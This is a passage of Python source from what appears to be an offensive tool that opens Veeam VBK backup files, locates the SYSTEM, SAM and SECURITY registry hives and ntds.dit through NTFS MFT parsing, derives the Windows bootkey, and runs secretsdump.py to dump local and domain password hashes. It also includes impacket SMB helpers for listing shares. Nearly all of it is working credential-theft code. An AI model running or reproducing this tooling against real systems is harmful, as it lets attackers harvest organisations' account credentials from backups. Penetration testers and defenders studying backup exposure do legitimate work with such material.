        cand = []
        if idx < len(anchors): cand.append(anchors[idx])
        if idx > 0:            cand.append(anchors[idx - 1])
        la, fa = min(cand, key=lambda a: abs(a[0] - lba))
        guess_fi = fa + (lba - la)          # 1:1 within the segment
        if guess_fi < 0: guess_fi = 0
        if guess_fi >= len(self.fib_offsets): guess_fi = len(self.fib_offsets) - 1
        return self.fib_offsets[guess_fi]

    def add_anchor(self, lba, file_idx):
        self.lba_anchors.append((lba, file_idx))
        self.lba_anchors.sort()

    def walk_mft(self):
        for off in self.find_mft_blocks():
            d = self.decompress_at(off)
            for r in range(0, len(d), 1024):
                rec = d[r:r+1024]
                if rec[:4] not in (b'FILE', b'BAAD'): continue
                rec_num = struct.unpack_from("<I", rec, 0x2c)[0]
                yield rec_num, rec

    def _ensure_mft_index(self):
        """Walk MFT in parallel; build {rec_num: (names, data_attr)} index."""
        if hasattr(self, "_mft_index"): return
        cache = self._cache_path("mft_index.pkl")
        if cache.exists():
            import pickle
            try:
                with open(cache, "rb") as f:
                    self._mft_names, self._mft_data_attrs = pickle.load(f)
                self._mft_index = True
                tprint(f"  [*] Loaded {len(self._mft_names)} MFT records from cache")
                return
            except Exception:
                pass
        mft_blocks = self.find_mft_blocks()
        tprint(f"  [*] Walking {len(mft_blocks)} MFT FIB blocks (parallel)...")
        t0 = time.time()
        self._mft_names = {}
        self._mft_data_attrs = {}
        n_proc = min(8, os.cpu_count() or 4)
        try:
            from multiprocessing import Pool
            with Pool(n_proc) as pool:
                args = [(self.vbk_path, off, self._clen_map.get(off)) for off in mft_blocks]
                for batch in pool.imap_unordered(_walk_mft_block_worker, args, chunksize=4):
                    for rec_num, names, da in batch:
                        self._mft_names[rec_num] = names
                        self._mft_data_attrs[rec_num] = da
                pool.terminate()
        except Exception as e:
            tprint(f"  [!] parallel walk failed ({e}); falling back single-thread")
            for off in mft_blocks:
                for rec_num, names, da in _walk_mft_block_worker((self.vbk_path, off, self._clen_map.get(off))):
                    self._mft_names[rec_num] = names
                    self._mft_data_attrs[rec_num] = da
        self._mft_index = True
        tprint(f"  [+] {len(self._mft_names)} MFT records ({time.time()-t0:.1f}s)")
        try:
            import pickle
            with open(cache, "wb") as f:
                pickle.dump((self._mft_names, self._mft_data_attrs), f, protocol=4)
        except Exception:
            pass

    def find_file(self, target_path):
        """Return (rec_num, data_attr) for target_path, or None."""
        self._ensure_mft_index()
        target_path = target_path.replace("/", "\\").lstrip("\\")
        parts = target_path.split("\\")
        target_name = parts[-1].lower()
        target_parents = [p.lower() for p in parts[:-1]]
        for rec_num, fnames in self._mft_names.items():
            for parent, name, ns in fnames:
                if ns == 2: continue
                if name.lower() == target_name:
                    ok = True
                    p = parent
                    for expected in reversed(target_parents):
                        pn = next(((pp, pn) for pp, pn, pns in self._mft_names.get(p, [])
                                   if pns != 2), None)
                        if pn is None or pn[1].lower() != expected:
                            ok = False; break
                        p = pn[0]
                    if ok: return rec_num, self._mft_data_attrs.get(rec_num)
        return None

    def extract_runs(self, runs, total_size):
        out = bytearray()
        for run_len, lcn in runs:
            byte_count = run_len * 4096
            if lcn is None:
                out.extend(b'\x00' * byte_count); continue
            byte_off = lcn * 4096
            remaining = byte_count
            while remaining > 0:
                lba = byte_off // (1 << 20)
                in_off = byte_off % (1 << 20)
                chunk = min(remaining, (1 << 20) - in_off)
                fib_off = self.lba_to_fib(lba)
                d = self.decompress_at(fib_off)
                if len(d) != 0x100000:
                    out.extend(b'\x00' * chunk)
                else:
                    out.extend(d[in_off:in_off + chunk])
                byte_off += chunk
                remaining -= chunk
        return bytes(out[:total_size])

    # ── Content-verified extraction ─────────────────────────────────────────
    # A file's NTFS runs can live in *different* Veeam backup extents, each
    # with its own LBA→FIB offset.  Anchoring only run 0 and mapping the rest
    # by nearest-anchor delta silently pulls foreign blocks for runs that sit
    # in another extent (the NTDS "getNextRow" corruption).  So we locate each
    # run's block by *verifying its content* — spiralling out from the guess
    # until the bytes actually belong to this file — and only fall back to the
    # positional guess when nothing verifies (or no verifier applies).

    def _decomp_cached(self, fib_idx):
        if not (0 <= fib_idx < len(self.fib_offsets)):
            return None
        off = self.fib_offsets[fib_idx]
        c = self._decomp_cache.get(off)
        if c is None:
            try: c = self.decompress_at(off)
            except Exception: c = b""
            if len(self._decomp_cache) > 512:
                self._decomp_cache.clear()
            self._decomp_cache[off] = c
        return c if len(c) == 0x100000 else None

    @staticmethod
    def _make_verifier(kind):
        """Return verify(block, in_off, file_off) -> True/False/None.
        None means 'cannot tell' (accept the positional guess)."""
        if kind == "ese":
            # An ESE 8 KB page carries an XOR checksum in its first 8 bytes such
            # that (checksum_lo ^ xor(all later u32 words)) == pgno-1, where
            # pgno = page's byte offset in the file / 8192.  We verify a block
            # by checking the pages that fall in it.  Unused pages are all-zero
            # (unverifiable) and pages 0/1 are the DB + shadow headers, so both
            # are skipped — otherwise a correct block with an empty page would
            # be rejected and trigger a pointless full-radius search.
            def vz(block, in_off, file_off):
                checked = valid = 0
                for k in range(8):
                    p = in_off + k * 8192
                    if p + 8192 > len(block):
                        break
                    pgno = (file_off + k * 8192) // 8192
                    if pgno < 2:
                        continue
                    page = block[p:p + 8192]
                    if not page.rstrip(b"\x00"):
                        continue                       # unused page
                    checked += 1
                    stored = int.from_bytes(page[:4], "little")
                    if (stored ^ _xor32(page[8:])) == (pgno - 1):
                        valid += 1
                return None if checked == 0 else (valid == checked)
            return vz
        if kind == "hive":
            def vz(block, in_off, file_off):
                seg = block[in_off:in_off + 8]
                if file_off == 0:
                    return seg[:4] == b"regf"
                if seg[:4] == b"hbin":     # bin boundary: offset field must match
                    return struct.unpack_from("<I", block, in_off + 4)[0] == file_off - 0x1000
                return None                # mid-bin: unverifiable, trust the guess
            return vz
        return None

    def _resolve_block(self, guess, in_off, file_off, verify, radius):
        guess = max(0, min(guess, len(self.fib_offsets) - 1))
        if verify is None:
            return guess
        gd = self._decomp_cached(guess)
        gv = verify(gd, in_off, file_off) if gd is not None else False
        if gv is not False:                # True or None -> accept guess
            return guess
        n = len(self.fib_offsets)
        for r in range(1, radius + 1):     # spiral out until content verifies
            for fi in (guess - r, guess + r):
                d = self._decomp_cached(fi)
                if d is not None and verify(d, in_off, file_off) is True:
                    return fi
        # Last resort: the block sits further from the guess than `radius`
        # (huge/heavily-deduped VBK, or an anchor we never pinned).  Sweep the
        # whole file so correctness never depends on the guess being close.
        # Only ever hit at a mis-seeded run start — once found, the rest of the
        # run chains locally, so this stays rare.
        for fi in range(n):
            if abs(fi - guess) <= radius:
                continue               # already covered by the spiral
            d = self._decomp_cached(fi)
            if d is not None and verify(d, in_off, file_off) is True:
                return fi
        return guess

    def extract_runs_verified(self, runs, total_size, kind=None, radius=512):
        verify = self._make_verifier(kind)
        # Self-calibrate: run 0 is content-anchored/known-good.  If the verifier
        # rejects it, its scheme doesn't fit this file (e.g. a different ESE
        # checksum format) — disable it rather than search destructively.
        if verify is not None:
            for run_len, lcn in runs:
                if lcn is None: continue
                g = self.fib_offsets.index(self.lba_to_fib((lcn * 4096) >> 20))
                d = self._decomp_cached(g)
                if d is not None and verify(d, (lcn * 4096) % (1 << 20), 0) is False:
                    verify = None
                break
        out = bytearray()
        file_off = 0
        prev_fib = prev_lba = None
        for run_len, lcn in runs:
            run_bytes = run_len * 4096
            if lcn is None:
                out.extend(b"\x00" * run_bytes)
                file_off += run_bytes; prev_fib = prev_lba = None; continue
            byte_off = lcn * 4096
            remaining = run_bytes
            while remaining > 0:
                lba = byte_off // (1 << 20)
                in_off = byte_off % (1 << 20)
                chunk = min(remaining, (1 << 20) - in_off)
                if prev_fib is not None:
                    guess = prev_fib + (lba - prev_lba)   # contiguous within extent
                else:
                    guess = self.fib_offsets.index(self.lba_to_fib(lba))
                fib = self._resolve_block(guess, in_off, file_off, verify, radius)
                d = self._decomp_cached(fib)
                out.extend(d[in_off:in_off + chunk] if d is not None else b"\x00" * chunk)
                prev_fib, prev_lba = fib, lba
                byte_off += chunk; remaining -= chunk; file_off += chunk
        return bytes(out[:total_size])

    def close(self):
        try: self.fh.close()
        except: pass


# ═══ Bootkey extraction from SYSTEM hive ═══════════════════════════════════════

def extract_bootkey(extractor):
    """Walk MFT for SYSTEM, extract first cluster run, find JD/Skew1/GBG/Data."""
    found = extractor.find_file("Windows/System32/config/SYSTEM")
    if not found: return None
    rec_num, da = found
    if da is None: return None
    ds, runs_or_data, nonres = da
    if not nonres:
        out = runs_or_data[:ds]
    else:
        runs = decode_runs(runs_or_data)
        first_run = runs[:1]
        first_run_size = first_run[0][0] * 4096
        out = extractor.extract_runs(first_run, first_run_size)
    targets = [b"JD", b"Skew1", b"GBG", b"Data"]
    classes = {}
    for m in re.finditer(b'nk', out):
        i = m.start()
        if i < 4: continue
        try:
            sz = struct.unpack_from("<i", out, i-4)[0]
            if abs(sz) < 0x4c or abs(sz) > 0x1000: continue
            class_off = struct.unpack_from("<I", out, i+0x30)[0]
            class_len = struct.unpack_from("<H", out, i+0x4a)[0]
            name_len = struct.unpack_from("<H", out, i+0x48)[0]
            if name_len == 0 or name_len > 0x20: continue
            name = out[i+0x4c:i+0x4c+name_len]
            if name in targets and class_off != 0xFFFFFFFF and 0 < class_len < 0x40:
                cp = 0x1000 + class_off + 4
                if cp + class_len > len(out): continue
                cname = out[cp:cp+class_len].decode("utf-16-le", errors="replace")
                if name not in classes and re.match(r'^[0-9a-f]{8}$', cname):
                    classes[name] = cname
        except: continue
    if not all(t in classes for t in targets): return None
    raw = bytes.fromhex(classes[b"JD"] + classes[b"Skew1"]
                        + classes[b"GBG"] + classes[b"Data"])
    perm = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
    return bytes(raw[i] for i in perm).hex()


# ═══ Target-file helpers ══════════════════════════════════════════════════════

def _target_kind(path):
    """Content-verifier class for a target file (drives extract_runs_verified)."""
    base = path.replace("\\", "/").rsplit("/", 1)[-1].lower()
    if base == "ntds.dit":
        return "ese"
    if base in ("sam", "security", "system"):
        return "hive"
    return None


# ═══ Per-VBK pipeline ════════════════════════════════════════════════════════

# ═══ Full-extract path (--full-extract): dump raw disk image via dissect ══════

def _vhd_footer(disk_size):
    """Build a 512-byte Fixed VHD footer per the Microsoft VHD spec."""
    import struct, uuid, time as _time
    # CHS geometry (Microsoft VHD spec algorithm)
    total_sec = disk_size // 512
    if total_sec > 65535 * 16 * 255:
        total_sec = 65535 * 16 * 255
    if total_sec >= 65535 * 16 * 63:
        spt, heads = 255, 16
        cyls = total_sec // (heads * spt)
    else:
        spt = 17
        cyls = total_sec // spt
        heads = max(4, (cyls + 1023) // 1024)
        if cyls >= 1024 * heads:
            spt, heads = 31, 16
            cyls = total_sec // (spt * heads)
        if cyls >= 1024 * heads:
            spt, heads = 63, 16
            cyls = total_sec // (spt * heads)
        if cyls >= 1024 * heads:
            cyls = 1023
    cyls = min(cyls, 65535)

    footer = bytearray(512)
    footer[0:8]   = b"conectix"
    struct.pack_into(">I", footer,  8, 0x00000002)          # features
    struct.pack_into(">I", footer, 12, 0x00010000)          # format version 1.0
    struct.pack_into(">Q", footer, 16, 0xFFFFFFFFFFFFFFFF)  # data offset (fixed)
    struct.pack_into(">I", footer, 24, max(0, int(_time.time()) - 946684800))  # vhd epoch
    footer[28:32] = b"win "
    struct.pack_into(">I", footer, 32, 0x000A0000)          # creator ver 10.0
    footer[36:40] = b"Wi2k"
    struct.pack_into(">Q", footer, 40, disk_size)           # original size
    struct.pack_into(">Q", footer, 48, disk_size)           # current size (48-55)
    footer[56] = (cyls >> 8) & 0xFF                         # disk geometry (56-59)
    footer[57] = cyls & 0xFF
    footer[58] = heads & 0xFF
    footer[59] = spt & 0xFF
    struct.pack_into(">I", footer, 60, 2)                   # disk type: fixed (60-63)
    footer[64:68] = b"\x00\x00\x00\x00"                    # checksum placeholder (64-67)
    footer[68:84] = uuid.uuid4().bytes                      # unique ID (68-83)
    csum = (~sum(footer)) & 0xFFFFFFFF
    struct.pack_into(">I", footer, 64, csum)
    return bytes(footer)


def _vbk_encrypted(vbk_path):
    """Quick encryption probe — returns True/False/None (None = undetermined).

    Check order:
    1. Sibling .vbm XML file — EncryptionState != 0 is definitive, no I/O on the VBK.
    2. keyset_id on FIB block descriptors (dissect, no block I/O).
    3. Single LZ4 decompression attempt (dissect fallback).
    If dissect itself crashes parsing the VBK structure that also indicates encryption.
    """
    import re as _re

    # --- 1. VBM sidecar (fastest, works even when the VBK is unreadable) ---
    vbk_p = Path(vbk_path)
    for vbm in vbk_p.parent.glob("*.vbm"):
        try:
            m = _re.search(rb'EncryptionState="(\d+)"', vbm.read_bytes())
            if m:
                state = int(m.group(1))
                if state == 2:   return True   # encrypted
                if state == 0:   return False  # plaintext
                # state == 1: encryption key configured but not applied to this run
                # fall through to dissect checks
        except Exception:
            continue

    # --- 2 & 3. Dissect-based block-level checks ---
    try:
        from dissect.archive import vbk as _vbk
        from dissect.archive.vbk import FibStream
        from dissect.util.compression import lz4 as _lz4
    except ImportError:
        return None

    NULL_KID = b"\x00" * 16
    try:
        with open(vbk_path, "rb") as fh:
            v = _vbk.VBK(fh)
            h2blk = {}
            for i in range(min(100, v.block_store.count)):
                sd = v.block_store.get(i)
                h2blk[bytes(sd.digest)] = sd
            FibStream._read = lambda self, o, n: b""   # stub; we only use .table.get()
            for folder in v.root.iterdir():
                for item in folder.iterdir():
                    try:
                        if item.is_dir() or item.size < (16 << 20):
                            continue
                    except Exception:
                        continue
                    nm = item.name.lower()
                    if nm.endswith((".xml", ".zip")) or nm.startswith("digest_"):
                        continue
                    df = item.open()
                    probe = min(16, (item.size + v.block_size - 1) // v.block_size)
                    for bi in range(probe):
                        try:
                            bd = df.table.get(bi)
                            if hasattr(bd, "keyset_id"):
                                kid = bytes(bd.keyset_id)
                                if len(kid) == 16:
                                    return kid != NULL_KID
                        except Exception:
                            continue
                    for bi in range(probe):
                        try:
                            bd = df.table.get(bi)
                            if int(bd.type) == 1:
                                continue
                            sd = h2blk.get(bytes(bd.digest))
                            if sd is None:
                                continue
                            with open(vbk_path, "rb") as fh2:
                                fh2.seek(sd.offset)
                                raw = fh2.read(sd.compressed_size)
                            if sd.is_compressed():
                                _lz4.decompress(memoryview(raw)[12:], sd.source_size)
                            return False
                        except Exception:
                            return True
    except Exception:
        # dissect crashed parsing the VBK — encrypted VBKs have encrypted metadata
        # that dissect can't traverse, so a parse crash is a strong encryption signal
        # if the VBM check above didn't already give us a definitive answer.
        return True
    return None


def _dump_images_via_dissect(vbk_path, out_dir):
    """Stream every disk stored in a VBK to out_dir as VHD/VHDX.
    Uses a parallel sliding-window pipeline: WORKERS threads fetch+decompress
    blocks from the VBK while the main thread writes, overlapping I/O and CPU."""
    from dissect.archive import vbk as _vbk
    from dissect.archive.vbk import FibStream
    from dissect.util.compression import lz4 as _lz4
    from concurrent.futures import ThreadPoolExecutor
    from collections import deque
    import queue as _queue

    WORKERS = 4          # parallel fetch+decompress threads
    WINDOW  = WORKERS * 4  # futures kept in flight ahead of the write cursor

    fh = open(vbk_path, "rb")
    v = _vbk.VBK(fh)
    print(f"[*] VBK opened (dissect, format v{v.format_version})")
    h2blk = {}
    for i in range(v.block_store.count):
        sd = v.block_store.get(i)
        h2blk[bytes(sd.digest)] = sd
    print(f"[*] {len(h2blk)} blocks in digest map")

    # Kept for the 8-byte magic peek (df.seek/read only, not the hot path)
    def _read(self, offset, length):
        result = []; bs = self.vbk.block_size
        while length > 0:
            bi = offset // bs; oib = offset % bs; rs = min(length, bs - oib)
            bd = self.table.get(bi)
            if int(bd.type) == 1:
                result.append(b"\x00" * rs)
            else:
                sd = h2blk.get(bytes(bd.digest))
                if sd is None:
                    result.append(b"\x00" * rs)
                else:
                    self.vbk.fh.seek(sd.offset)
                    raw = self.vbk.fh.read(sd.compressed_size)
                    result.append((_lz4.decompress(memoryview(raw)[12:], sd.source_size)
                                   if sd.is_compressed() else raw)[oib:oib + rs])
            offset += rs; length -= rs
        return b"".join(result)
    FibStream._read = _read

    images = []
    ZEROS = b"\x00" * (1 << 20)

    for folder in v.root.iterdir():
        for item in folder.iterdir():
            try:
                if item.is_dir() or item.size < (16 << 20):
                    continue
            except Exception:
                continue
            nm = item.name.lower()
            if nm.endswith((".xml", ".zip")) or nm.startswith("digest_"):
                continue
            size = item.size
            try:
                df = item.open()
                df.seek(0); magic = df.read(8); df.seek(0)
                is_vhdx = magic == b"vhdxfile"
                ext = ".vhdx" if is_vhdx else ".vhd"
                out_path = out_dir / (Path(item.name).stem + ext)
                fmt_label = "VHDX (native)" if is_vhdx else "VHD (fixed)"
                print(f"[*] Dumping {item.name} ({size/(1<<30):.1f} GB, {fmt_label}) → {out_path}")

                # Pre-scan the block address table — one pass, memory only
                bs = v.block_size
                num_blocks = (size + bs - 1) // bs
                block_sds = []  # None → zero block, else → block store descriptor
                for bi in range(num_blocks):
                    bd = df.table.get(bi)
                    block_sds.append(None if int(bd.type) == 1
                                     else h2blk.get(bytes(bd.digest)))

                # Pool of WORKERS open file handles — avoids open()/close() per block
                _fh_q = _queue.SimpleQueue()
                _fhs = [open(vbk_path, "rb") for _ in range(WORKERS)]
                for _f in _fhs:
                    _fh_q.put(_f)

                def _fetch(sd):
                    _fh = _fh_q.get()
                    try:
                        _fh.seek(sd.offset)
                        raw = _fh.read(sd.compressed_size)
                        return (_lz4.decompress(memoryview(raw)[12:], sd.source_size)
                                if sd.is_compressed() else raw)
                    finally:
                        _fh_q.put(_fh)

                try:
                    t0 = time.time(); pos = 0; sparse_bytes = 0
                    with ThreadPoolExecutor(max_workers=WORKERS) as pool, \
                         open(out_path, "wb") as img:
                        pending = deque()
                        submit_at = 0

                        def advance():
                            nonlocal submit_at
                            while submit_at < num_blocks and len(pending) < WINDOW:
                                sd = block_sds[submit_at]
                                pending.append(None if sd is None
                                               else pool.submit(_fetch, sd))
                                submit_at += 1

                        advance()
                        for _ in range(num_blocks):
                            advance()
                            fut = pending.popleft()
                            expected = min(bs, size - pos)
                            if fut is None:
                                chunk = ZEROS[:expected]
                            else:
                                chunk = fut.result()
                                if len(chunk) != expected:
                                    chunk = (chunk + b"\x00" * expected)[:expected]

                            if chunk == ZEROS[:expected]:
                                img.seek(expected, 1)
                                sparse_bytes += expected
                            else:
                                img.write(chunk)
                            pos += expected

                            if pos % (128 << 20) == 0 or pos >= size:
                                elapsed = time.time() - t0
                                mbps = (pos >> 20) / max(elapsed, 0.1)
                                eta = ((size - pos) >> 20) / max(mbps, 0.1)
                                print(f"    {100*pos//size}%  {pos/(1<<30):.1f}/{size/(1<<30):.1f} GB"
                                      f"  {mbps:.0f} MB/s  ETA {_fmt_eta(eta)}      ", end="\r")

                        if is_vhdx:
                            img.truncate(size)
                        else:
                            img.truncate(size)
                            img.write(_vhd_footer(size))
                finally:
                    for _f in _fhs:
                        try: _f.close()
                        except: pass

                print(f"\n  [+] {out_path} "
                      f"({size/(1<<30):.1f} GB, {sparse_bytes/(1<<30):.1f} GB sparse, "
                      f"{time.time()-t0:.1f}s)")
                print(f"  [*] Run: sudo vhdvomit.py --local-path '{out_path}'")
                images.append(out_path)
            except Exception as e:
                print(f"\n  [!] Dump failed: {e}")
    return images


def _process_vbk_full_extract(vbk_path, out_dir):
    try:
        images = _dump_images_via_dissect(vbk_path, Path(out_dir))
    except ImportError as e:
        print(f"[!] --full-extract needs the 'dissect' library ({e}).")
        print("    Install it: pip install dissect")
        return False
    except Exception as e:
        print(f"[!] Full extract failed: {e}")
        return False
    return bool(images)


# ═══ Fast path (--fast): dissect-based direct extraction ══════════════════════
# Instead of scan + content-verified reassembly, use Fox-IT's `dissect` library
# to resolve the VBK's content-addressed (deduplicated) blocks by their digest,
# mount the embedded NTFS volume, and read the target files directly — no search.
# Needs `pip install dissect`.  Kept behind --fast while the default path is the
# proven reassembler.

_FAST_TARGETS = {   # output name -> candidate NTFS paths
    "SYSTEM.hive":   ["windows/system32/config/SYSTEM"],
    "SAM.hive":      ["windows/system32/config/SAM"],
    "SECURITY.hive": ["windows/system32/config/SECURITY"],
    "ntds.dit":      ["windows/ntds/ntds.dit", "windows/system32/ntds.dit"],
}
_NTFS_VBR = b"\xeb\x52\x90NTFS    "


def _count_stored_fib_blocks(df):
    """Return (stored, total) FIB block counts for a FibStream, or (-1, -1) on error."""
    try:
        t = df.table
        total = t.count
        stored = 0
        for td in t._vec:
            if td.page == -1:
                continue
            try:
                pv = t._open_table(td.page, td.count)
                for ei in range(td.count):
                    try:
                        bd = pv.get(ei)
                        if int(bd.type) != 1:
                            stored += 1
                    except Exception:
                        break
            except Exception:
                continue
        return stored, total
    except Exception:
        return -1, -1


def _extract_via_dissect(vbk_path, work, want_ntds):
    """Open the VBK with dissect, resolve dedup blocks by digest, mount its
    NTFS volume(s), and extract the target hives + ntds.dit into `work`.
    Returns {output_name: Path}.  Raises ImportError if dissect is missing."""
    from dissect.archive import vbk as _vbk
    from dissect.archive.vbk import FibStream
    from dissect.util.compression import lz4 as _lz4
    from dissect.util.stream import RangeStream
    from dissect.ntfs import NTFS
    from dissect.ntfs.exceptions import BrokenIndexError as _BrokenIndexError

    class _RobustNTFS(NTFS):
        """NTFS subclass that survives BrokenIndexError in $Secure/$Usnjrnl init.
        The MFT is fully loaded before those fail, so path lookups still work."""
        def __init__(self, *a, **kw):
            try:
                super().__init__(*a, **kw)
            except _BrokenIndexError:
                pass

    t0 = time.time()
    fh = open(vbk_path, "rb")
    v = _vbk.VBK(fh)
    print(f"[*] VBK opened (dissect, format v{v.format_version})")
    # digest -> storage block descriptor (the content-addressed resolver)
    h2blk = {}
    for i in range(v.block_store.count):
        sd = v.block_store.get(i)
        h2blk[bytes(sd.digest)] = sd
    print(f"[*] digest→block map: {len(h2blk)} blocks ({time.time()-t0:.1f}s)")

    def _read(self, offset, length):
        out = []; bs = self.vbk.block_size
        while length > 0:
            bi = offset // bs; oib = offset % bs; rs = min(length, bs - oib)
            bd = self.table.get(bi)
            if int(bd.type) == 1:                    # Sparse
                out.append(b"\x00" * rs)
            else:                                    # Normal / digest-referenced (16)
                sd = h2blk.get(bytes(bd.digest))
                if sd is None:
                    out.append(b"\x00" * rs)
                else:
                    self.vbk.fh.seek(sd.offset)
                    raw = self.vbk.fh.read(sd.compressed_size)
                    out.append((_lz4.decompress(memoryview(raw)[12:], sd.source_size)
                                if sd.is_compressed() else raw)[oib:oib + rs])
            offset += rs; length -= rs
        return b"".join(out)
    FibStream._read = _read

    want = dict(_FAST_TARGETS)
    if not want_ntds:
        want.pop("ntds.dit", None)
    found = {}
    sparse_disks = []  # collect (name, stored_count) for incremental diagnosis
    for folder in v.root.iterdir():
        for item in folder.iterdir():
            try:
                if item.is_dir() or item.size < (16 << 20):
                    continue
            except Exception:
                continue
            nm = item.name.lower()
            if nm.endswith((".xml", ".zip")) or nm.startswith("digest_"):
                continue
            try:
                df = item.open(); size = item.size
            except Exception:
                continue

            # Quick sparse-VBK check: detect incrementals by stored-block ratio
            stored_blocks, total_blocks = _count_stored_fib_blocks(df)
            if stored_blocks >= 0 and total_blocks > 0 and stored_blocks / total_blocks < 0.05:
                sparse_disks.append((item.name, stored_blocks, total_blocks))

            # NTFS volume offsets: MBR partitions, else scan for VBRs
            starts = []
            try:
                df.seek(0)
                mbr = df.read(512)
                if mbr[510:512] == b"\x55\xaa":
                    for pi in range(4):
                        e = mbr[446 + pi * 16: 446 + pi * 16 + 16]
                        if e[4] and e[4] != 0xEE:
                            s = struct.unpack_from("<I", e, 8)[0] * 512
                            if 0 < s < size: starts.append(s)
            except Exception:
                pass
            if not starts:
                for off in range(0, min(size, 2 << 30), 1 << 20):
                    try:
                        df.seek(off)
                        if df.read(11) == _NTFS_VBR: starts.append(off)
                    except Exception:
                        break
            for start in starts:
                try:
                    ntfs = _RobustNTFS(RangeStream(df, start, size - start))
                except Exception:
                    continue
                for out_name, paths in want.items():
                    if out_name in found:
                        continue
                    for p in paths:
                        try:
                            data = ntfs.mft.get(p).open().read()
                            dst = work / out_name
                            dst.write_bytes(data)
                            found[out_name] = dst
                            print(f"  [+] {out_name} ({len(data):,} bytes) from disk {item.name}")
                            break
                        except Exception:
                            continue
    print(f"[*] extraction done ({time.time()-t0:.1f}s)")

    if not found and sparse_disks:
        for disk_name, sc, tot in sparse_disks:
            pct = sc * 100 // tot
            print(f"  [!] Disk {disk_name}: {sc}/{tot} blocks stored ({pct}%)")
            print(f"      Incremental backup — credential files are in the previous full")
            print(f"      VBK in the chain. Run against that file to extract credentials.")

    return found


def _process_vbk_fast(vbk_path, sd_path, work, want_ntds):
    try:
        found = _extract_via_dissect(vbk_path, work, want_ntds)
    except ImportError as e:
        print(f"[!] --fast needs the 'dissect' library ({e}).")
        print("    Install it (pip install dissect) or run without --fast.")
        return False
    except Exception as e:
        print(f"[!] fast extraction failed: {e}")
        print("    Falling back is available by re-running without --fast.")
        return False
    if not found:
        print("[!] No target files found (wrong volume, encrypted, or unsupported VBK)")
        return False
    if not sd_path:
        return True
    cmd = [*sd_path]
    for name, flag in (("SYSTEM.hive", "-system"), ("SAM.hive", "-sam"),
                       ("SECURITY.hive", "-security"), ("ntds.dit", "-ntds")):
        if name in found:
            cmd += [flag, str(found[name])]
    cmd.append("LOCAL")
    print("\n[*] Running secretsdump.py...")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
        (work / "secretsdump.txt").write_text(r.stdout + r.stderr)
        print(r.stdout)
        if r.stderr.strip():
            print(r.stderr, file=sys.stderr)
    except subprocess.TimeoutExpired:
        print("[!] secretsdump timed out")
    return True


def process_vbk(vbk_path, sd_path, out_dir, label=None, want_ntds=False, fast=False,
                full_extract=False, extract_dir=None):
    label = label or Path(vbk_path).stem
    print(f"\n{'='*72}")
    print(f"[*] Processing {vbk_path}  ({size_str(vbk_path)})")
    print(f"{'='*72}")
    enc = _vbk_encrypted(vbk_path)
    if enc is True:
        print("[!] ENCRYPTED — this VBK is password-protected. Extraction not possible.")
        print("    Veeam encryption uses AES-256; the key is not recoverable without the backup password.")
        return False
    elif enc is False:
        print("[*] Encryption: not encrypted")
    work = Path(out_dir) / label
    work.mkdir(parents=True, exist_ok=True)

    if full_extract:
        img_dir = Path(extract_dir) / label if extract_dir else work
        img_dir.mkdir(parents=True, exist_ok=True)
        return _process_vbk_full_extract(vbk_path, img_dir)

    if fast:
        return _process_vbk_fast(vbk_path, sd_path, work, want_ntds)

    try:
        ex = VBKExtractor(vbk_path, want_ntds=want_ntds)
    except Exception as e:
        print(f"[!] Failed to open VBK: {e}"); return False
    try:
        try:
            ex.calibrate()
        except Exception as e:
            print(f"[!] Calibration failed: {e}")
            print("    (likely an encrypted VBK — not yet supported)"); return False

        print("[*] Extracting bootkey from SYSTEM...")
        bootkey = extract_bootkey(ex)
        if not bootkey:
            print("[!] Bootkey extraction failed"); return False
        print(f"[+] Bootkey: {bootkey}")

        targets = {
            "Windows/System32/config/SAM": work / "SAM.hive",
            "Windows/System32/config/SECURITY": work / "SECURITY.hive",
        }
        # Probe for NTDS.dit (domain controller backups) — opt-in only
        ntds_target = None
        if want_ntds:
            for ntds_path in ("Windows/NTDS/ntds.dit", "Windows/System32/ntds.dit"):
                if ex.find_file(ntds_path):
                    ntds_target = ntds_path
                    targets[ntds_path] = work / "ntds.dit"
                    print(f"[*] NTDS detected at {ntds_path}")
                    break

        extracted = {}
        for path, out_file in targets.items():
            print(f"[*] Extracting {path}...")
            found = ex.find_file(path)
            if not found:
                print(f"  [!] {path} not found in MFT"); continue
            rec_num, da = found
            if da is None:
                print(f"  [!] {path} has no DATA attr"); continue
            ds, runs_or_data, nonres = da
            if not nonres:
                out_file.write_bytes(runs_or_data[:ds])
            else:
                runs = decode_runs(runs_or_data)
                data = ex.extract_runs_verified(runs, ds, kind=_target_kind(path))
                out_file.write_bytes(data)
            print(f"  [+] {out_file.name} ({ds:,} bytes)")
            extracted[path] = out_file

        if not extracted or not sd_path:
            return bool(extracted)

        sam = work / "SAM.hive"
        sec = work / "SECURITY.hive"
        ntds = work / "ntds.dit"
        cmd = [*sd_path, "-bootkey", bootkey]
        if sam.exists():  cmd.extend(["-sam",      str(sam)])
        if sec.exists():  cmd.extend(["-security", str(sec)])
        if ntds.exists(): cmd.extend(["-ntds",     str(ntds)])
        cmd.append("LOCAL")
        print(f"\n[*] Running secretsdump.py...")
        out_path = work / "secretsdump.txt"
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            out_path.write_text(r.stdout + r.stderr)
            print(r.stdout)
            if r.stderr.strip():
                print(r.stderr, file=sys.stderr)
        except subprocess.TimeoutExpired:
            print("[!] secretsdump timed out")
        return True
    finally:
        ex.close()


# ═══ SMB / mount helpers (unchanged from vbkvomit) ═════════════════════════════

def _decode_smb(val):
    """Decode a share name/comment field that may be bytes or str-with-nulls."""
    if isinstance(val, bytes):
        for enc in ("utf-16le", "utf-8", "latin1"):
            try: return val.decode(enc).replace("\x00", "").strip()
            except: pass
        return ""
    return str(val).replace("\x00", "").strip()

def list_smb_shares(host, user, password, domain):
    try: from impacket.smbconnection import SMBConnection
    except ImportError: die("impacket not found: pip install impacket")
    conn = SMBConnection(host, host, sess_port=445)
    conn.login(user, password, domain)
    result = []
    for s in conn.listShares():
        try: name = _decode_smb(s["shi1_netname"])
        except: name = _decode_smb(s.get("shi1_netname", ""))
        if not name or name.upper() in ("IPC$", "ADMIN$"): continue
        try: remark = _decode_smb(s.get("shi1_remark", ""))
        except: remark = ""
        result.append((name, remark))
    conn.logoff()
    return result

def select_shares(shares):
    print("\n[*] Available shares:")
    for i, (n, r) in enumerate(shares, 1):
        print(f"  [{i}] {n}" + (f" — {r}" if r else ""))
    print("  [a] All")
    while True:
